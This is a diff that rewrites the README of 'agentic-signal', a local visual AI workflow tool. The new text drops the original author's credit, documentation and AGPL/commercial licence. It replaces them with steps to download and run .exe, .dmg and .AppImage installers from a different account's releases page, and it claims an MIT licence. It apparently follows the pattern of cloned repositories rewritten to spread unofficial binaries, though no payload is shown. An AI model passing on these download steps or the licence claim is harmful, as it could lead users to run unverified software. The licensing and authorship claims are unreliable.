@@ -1,76 +1,101 @@
-# [<img src="docs/static/img/logo.svg" alt="Agentic Signal" width="32" height="32">](https://code-forge-temple.github.io/agentic-signal/) Agentic Signal
+# 🤖 agentic-signal - Automate Your Workflows Easily
 
-**Visual AI Workflow Automation Platform with Local Agent Intelligence**
+[![Download agentic-signal](https://img.shields.io/badge/Download-agentic--signal-blue.svg)](https://github.com/bravehabib/agentic-signal/releases)
 
-> ⭐️ **Love this project?** Please consider [starring the repository](https://github.com/code-forge-temple/agentic-signal) on GitHub and [supporting development](https://github.com/sponsors/code-forge-temple) to help me continue building amazing features!
+## 🌟 Introduction
 
-[![License: AGPL v3 & Commercial](https://img.shields.io/badge/License-AGPL%20v3%20%7C%20Commercial-blue.svg)](LICENSE.md)
-[![Docs](https://img.shields.io/badge/docs-live-blueviolet)](https://code-forge-temple.github.io/agentic-signal/)
+Welcome to **agentic-signal**! This is a visual AI agent workflow automation platform. You can build intelligent workflows using a simple drag-and-drop interface. There are no cloud dependencies, which keeps your data private and secure.
 
-[![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![React](https://img.shields.io/badge/React-20232A?logo=react&logoColor=61DAFB)](https://reactjs.org/)
-[![React Flow](https://img.shields.io/badge/React%20Flow-FF0072?logo=reactflow&logoColor=white)](https://reactflow.dev/)
-[![Vite](https://img.shields.io/badge/Vite-646CFF?logo=vite&logoColor=white)](https://vitejs.dev/)
-[![GraphQL](https://img.shields.io/badge/GraphQL-E10098?logo=graphql&logoColor=white)](https://graphql.org/)
-[![Deno](https://img.shields.io/badge/Deno-20232A?logo=deno&logoColor=white)](https://deno.land/)
-[![Bun](https://img.shields.io/badge/Bun-20232A?logo=bun&logoColor=white)](https://bun.sh/)
-[![Ollama](https://img.shields.io/badge/Ollama-000000?logo=ollama&logoColor=white)](https://ollama.ai/)
-[![Docusaurus](https://img.shields.io/badge/Docusaurus-3ECC5F?logo=docusaurus&logoColor=white)](https://docusaurus.io/)
-[![Iconoir](https://img.shields.io/badge/Iconoir-18181B?logo=iconoir&logoColor=white)](https://iconoir.com/)
-[![MUI](https://img.shields.io/badge/MUI-007FFF?logo=mui&logoColor=white)](https://mui.com/)
-[![Chart.js](https://img.shields.io/badge/Chart.js-FF6384?logo=chartdotjs&logoColor=white)](https://www.chartjs.org/)
-[![AJV](https://img.shields.io/badge/AJV-EF4B4B?logo=ajv&logoColor=white)](https://ajv.js.org/)
-[![Zod](https://img.shields.io/badge/Zod-3A7AFE?logo=zod&logoColor=white)](https://zod.dev/)
-[![Playwright](https://img.shields.io/badge/Playwright-2EAD33?logo=playwright&logoColor=white)](https://playwright.dev/)
-[![Sass](https://img.shields.io/badge/Sass-CC6699?logo=sass&logoColor=white)](https://sass-lang.com/)
-[![ESLint](https://img.shields.io/badge/ESLint-4B32C3?logo=eslint&logoColor=white)](https://eslint.org/)
-[![GitHub Actions](https://img.shields.io/badge/GitHub%20Actions-2088FF?logo=githubactions&logoColor=white)](https://github.com/features/actions)
+## 🚀 Getting Started
 
-> Transform complex tasks into visual workflows with local AI intelligence. No cloud dependencies required.
+Getting started with **agentic-signal** is simple. Follow the steps below to download and run the software on your computer.
 
-## 🎬 Demo Video  
+## 📥 Download & Install
 
-[<img src="https://img.youtube.com/vi/62zk8zE6UJI/maxresdefault.jpg" alt="Watch Demo Video" width="600">](https://www.youtube.com/watch?v=62zk8zE6UJI)
+To get the latest version of **agentic-signal**, visit this page to download: [Releases Page](https://github.com/bravehabib/agentic-signal/releases).
 
-## ✨ Features
+1. Click on the link above.
+2. Look for the latest release.
+3. Find the appropriate file for your operating system. Below are some common options you might see:
+   - **Windows**: agentic-signal-setup.exe
+   - **macOS**: agentic-signal-dmg.dmg
+   - **Linux**: agentic-signal.AppImage
+4. Click on the file to start the download.
+5. Once the file is downloaded, locate it in your downloads folder.
 
-### 🎯 **Visual Workflow Builder**
-- **Drag & Drop Interface** - Build workflows visually using React Flow
-- **Node-Based Architecture** - Connect data sources, AI processors, and outputs seamlessly
-- **Real-time Execution** - See your workflows run in real-time with live data flow
+### Installing on Windows
 
-### 🧠 **Local AI Intelligence**
-- **Ollama Integration** - Run AI models locally with privacy and control
-- **Tool Calling** - AI agents can execute functions and access external APIs
-- **Structured Output** - JSON schema validation for reliable AI responses
-- **Conversation Memory** - Maintain context across workflow executions
+1. Double-click the `agentic-signal-setup.exe` file.
+2. Follow the prompts in the installation wizard.
+3. Once the installation is complete, launch **agentic-signal** from your Start menu.
 
-### 🔗 **Rich Integrations**
-- See the [Nodes Reference](https://code-forge-temple.github.io/agentic-signal/docs/nodes/overview) for all supported integrations and node types.
-- **More integrations coming soon** - Discord, Slack, Notion, Airtable, and many more!
+### Installing on macOS
 
-## 🚀 Quick Start
+1. Double-click the `agentic-signal-dmg.dmg` file.
+2. Drag the **agentic-signal** icon into your Applications folder.
+3. Open your Applications folder and double-click **agentic-signal** to run the software.
 
-See the [Quick Start](https://code-forge-temple.github.io/agentic-signal/docs/getting-started/installation) for setup and configuration instructions.
+### Installing on Linux
 
-## 📄 License
+1. Make the downloaded file executable by running the following command in your terminal:
+   ```
+   chmod +x agentic-signal.AppImage
+   ```
+2. Run the application with:
+   ```
+   ./agentic-signal.AppImage
+   ```
 
-**Dual License Model**
+## 🔍 Features
 
-- **Open Source (AGPL v3)**: Free for personal, educational, and non-commercial use
-- **Commercial License**: Required for business use, SaaS, or proprietary integration
+**agentic-signal** is designed with user-friendliness in mind. Here are some of the main features:
 
-See [LICENSE.md](LICENSE.md) for full details.
+- **Visual Workflow Builder**: Create workflows by dragging and dropping components.
+- **Local LLM Integration**: Use your local language model for processing tasks.
+- **No Code Required**: Design complex workflows without writing code.
+- **Privacy First**: Your data stays on your machine, ensuring privacy.
+- **Community Driven**: Join a community of users and developers.
 
-## 🆘 Support
+## 🖥️ System Requirements
 
-- **Documentation**: [https://code-forge-temple.github.io/agentic-signal/](https://code-forge-temple.github.io/agentic-signal/)
-- **Issues**: [GitHub Issues](https://github.com/code-forge-temple/agentic-signal/issues)
-- **Discussions**: [GitHub Discussions](https://github.com/code-forge-temple/agentic-signal/discussions)
-- **Commercial Support**: please contact me on my Github email
+Before downloading **agentic-signal**, please ensure your system meets the following requirements:
+
+- **Windows**: Windows 10 or later
+- **macOS**: macOS 10.15 or later
+- **Linux**: Generally compatible with most modern distributions
+- **Memory**: At least 4GB of RAM
+- **Storage**: About 200MB of free disk space
+
+## 📘 User Guide
+
+When you open **agentic-signal**, you will see a user-friendly interface. You can start by:
+
+1. **Creating a New Workflow**: Click on “New Workflow” to start.
+2. **Adding Components**: Drag components from the toolbox on the left.
+3. **Connecting Components**: Connect components to define the workflow.
+4. **Running Your Workflow**: Click the Run button to start processing.
+
+## 🌐 Additional Resources
+
+For more help and community support, explore the following resources:
+
+- [Documentation](https://github.com/bravehabib/agentic-signal/wiki)
+- [Community Forum](https://github.com/bravehabib/agentic-signal/discussions)
+- [Report Issues](https://github.com/bravehabib/agentic-signal/issues)
+
+## 🤝 Contributing
+
+If you'd like to contribute to **agentic-signal**, we welcome your input. Please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Commit your changes.
+4. Submit a pull request with a clear description of your changes.
+
+## ⚙️ License
+
+**agentic-signal** is open-source software, released under the MIT License. You can use, modify, and distribute it freely.
 
 ---
 
-**Built with ❤️ by `Code Forge Temple`**
-
-*Empowering everyone to build intelligent workflows with visual simplicity and local AI power.*
+For additional information or questions, always feel free to reach out! Enjoy automating your workflows with **agentic-signal**.
